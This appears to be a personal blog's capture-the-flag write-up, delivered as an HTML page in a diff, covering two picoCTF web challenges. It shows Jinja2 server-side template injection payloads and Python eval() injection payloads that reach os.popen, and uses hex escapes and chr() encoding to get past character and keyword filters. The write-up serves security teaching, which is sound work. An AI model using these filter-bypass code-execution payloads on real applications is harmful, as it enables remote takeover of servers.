@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="SSTI2
+I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website
+http://shape-facility.picoctf.net:63568/
+Website is vulnerable to SSTI
+
+Based on the server response header and templating evaluation, most probably a Python templating engine, Jinja2
+">  
+
+  <title>
+    
+      PicoCTF Web Medium Writeup
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.d21e6a19ea346f458ada43307d36e23a3fc456016a2a0ff21dd4f28d1029b5bd96f94ff0aff3fb25ce909d6821efc877f876e44d01fbe1d2648cd5ff58f6c070.css" integrity="sha512-0h5qGeo0b0WK2kMwfTbiOj/EVgFqKg/yHdTyjRAptb2W&#43;U/wr/P7Jc6QnWgh78h3&#43;HbkTQH74dJkjNX/WPbAcA==" />
+  </head>
+<body a="light">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">&lt; back</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-08-09 17:07:19 &#43;0800 &#43;08">
+            2025-08-09
+        </time>
+    </p>
+
+    <h1>PicoCTF Web Medium Writeup</h1>
+
+    
+
+    <h1 id="ssti2">SSTI2</h1>
+<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website</p>
+<p><a href="http://shape-facility.picoctf.net:63568/">http://shape-facility.picoctf.net:63568/</a></p>
+<p>Website is vulnerable to SSTI
+<img src="4f353aa04b3d12bbc315a7900e2f82ec1cb08d1e.png" alt="a"></p>
+<p>Based on the server response header and templating evaluation, most probably a Python templating engine, Jinja2
+<img src="790e45b4b52ecadead56b655e917f5c68529db65.png" alt="b"></p>
+<p>A typical Jinja SSTI payload is <code>{{ ().class.base.subclasses() }}</code></p>
+<p>The app filters certain characters like <code>_</code>, we can bypass the filter by replacing <code>_</code> with <code>\x5f</code>. To make our payload more subversive, we can also change the way we get attribute of an object from <code>foo.bar</code> to <code>foo|attr(&quot;bar&quot;)</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">class</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f\x5f\x5f</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># list the subclasses avaliable</span>
+</span></span><span style="display:flex;"><span>{{()<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">class</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">mro</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#f60">1</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">subclasses</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)()}}
+</span></span></code></pre></div><p>We can manually find the offset for os class or we can access the os class through the built python builtin functions. The example below utilise the request class to access python builtin functions.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#555">.</span>application<span style="color:#555">.</span><span style="color:#033">__globals__</span><span style="color:#555">.</span>
+</span></span><span style="display:flex;"><span>__builtins__<span style="color:#555">.</span>__import__(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;id&#39;</span>)<span style="color:#555">.</span>read()}}
+</span></span></code></pre></div><p>We can access the subclasses of each special methods in function as such <code>__globals__.__builtins__</code>. Since we are bypassing the filter, we can convert our payload from <code>__globals__.__builtins__</code> to <code>attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')</code></p>
+<p>The final payload</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;application&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">globals</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">builtins</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">getitem</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">import</span><span style="color:#c30;font-weight:bold">\x5f\x5f</span><span style="color:#c30">&#39;</span>)(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;popen&#39;</span>)(<span style="color:#c30">&#39;id&#39;</span>)<span style="color:#555">|</span>attr(<span style="color:#c30">&#39;read&#39;</span>)()}}
+</span></span></code></pre></div><p>SSTI to get RCE
+<img src="bba8bc573237b0886ac577b4a77ac8053e0473cc.png" alt="c"></p>
+<p>Locate the flag and read it
+<img src="49f56ee14ba09e0c4e03001ff2f7c31334129361.png" alt="d"></p>
+<p><img src="acb87892225f893fe9ce19216cebda869058dcf5.png" alt="e"></p>
+<h1 id="3vl">3v@l</h1>
+<p>ABC Bank&rsquo;s website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank&rsquo;s calculator and read the flag?</p>
+<p><img src="1bd85db1970efa6120aa9ec21f77681f843e0228.png" alt=""></p>
+<p>Server response suggests that it is a python application
+<img src="a7a052a7c0dddf41c3237af378818f7820af78e0.png" alt=""></p>
+<p>Payload <code>code=7*7</code> will show 49 in the HTML response. There seems to be some sort of evaluation of expressions. A possibility maybe through templating engine or functions like <code>eval()</code>.</p>
+<p><img src="ce9601cf2dfec1bb21d73762471b7efc810d7674.png" alt=""></p>
+<p><code>code=__import__('os').system('id')</code></p>
+<p><img src="d3cce9327123ae3dbd1dd3ac1f2d7d7af160508c.png" alt=""></p>
+<p>Since the user input is being evaluated, we can use chr(111)+chr(115) instead of the string <code>os</code>. Make sure to URL encode the <code>+</code> to <code>%2b</code>. You can get the unicode integer of a character using <code>chr('o')</code> -&gt; 111</p>
+<p><img src="95fe163414f731a61344e7ea15135a1c027a5739.png" alt=""></p>
+<p>List directory, again we are faced with forbidden keyword <code>ls</code>.</p>
+<p><img src="3bf9785d913590dbbba495d3463dca32c83aa572.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;l&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f60">108</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;s&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f60">115</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39; &#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f60">32</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;-&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f60">45</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&gt;&gt;&gt;</span> <span style="color:#366">ord</span>(<span style="color:#c30">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f60">97</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;ls -la&#39;</span>)<span style="color:#555">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">45</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>))<span style="color:#555">.</span>read()
+</span></span></code></pre></div><p><img src="e719e8e9f3ddc42f19d44a0ac1b86025daf865d1.png" alt=""></p>
+<p>The flag is in /flag.txt</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;ls -la /&#39;</span>)<span style="color:#555">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">45</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">47</span>))<span style="color:#555">.</span>read()
+</span></span></code></pre></div><p><img src="4a8af4b8f62892133b9be92d720ae9939afb9ba2.png" alt=""></p>
+<p>Read the flag</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code<span style="color:#555">=</span>__import(<span style="color:#c30">&#39;os&#39;</span>)<span style="color:#555">.</span>popen(<span style="color:#c30">&#39;cat /flag.txt&#39;</span>)<span style="color:#555">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f60">99</span> <span style="color:#f60">97</span> <span style="color:#f60">116</span> <span style="color:#f60">32</span> <span style="color:#f60">47</span> <span style="color:#f60">102</span> <span style="color:#f60">108</span> <span style="color:#f60">97</span> <span style="color:#f60">103</span> <span style="color:#f60">46</span> <span style="color:#f60">116</span> <span style="color:#f60">120</span> <span style="color:#f60">116</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code<span style="color:#555">=</span><span style="color:#366">__import__</span>(<span style="color:#366">chr</span>(<span style="color:#f60">111</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">115</span>))<span style="color:#555">.</span>popen(<span style="color:#366">chr</span>(<span style="color:#f60">99</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">32</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">47</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">102</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">108</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">97</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">103</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">46</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">120</span>)<span style="color:#555">%</span><span style="color:#f60">2</span>bchr(<span style="color:#f60">116</span>))<span style="color:#555">.</span>read()
+</span></span></code></pre></div><p><img src="752e089bf9ee5b1e0c6d2c4ef59fcb95098bd891.png" alt=""></p>
+<p>Another way to build the string via chr is using join method and lambda function</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;</span><span style="color:#555">.</span>join([<span style="color:#366">chr</span>(x) <span style="color:#069;font-weight:bold">for</span> x <span style="color:#000;font-weight:bold">in</span> [<span style="color:#f60">47</span>, <span style="color:#f60">102</span>, <span style="color:#f60">108</span>, <span style="color:#f60">97</span>, <span style="color:#f60">103</span>, <span style="color:#f60">46</span>, <span style="color:#f60">116</span>, <span style="color:#f60">120</span>, <span style="color:#f60">116</span>]])<span style="color:#555">.</span>read()
+</span></span></code></pre></div>
+</article>
+
+                
+    
+    
+        Nicholas Ch • © 2025
+    
+
+
+            </div>
+        </main>
+    </body>
+</html>
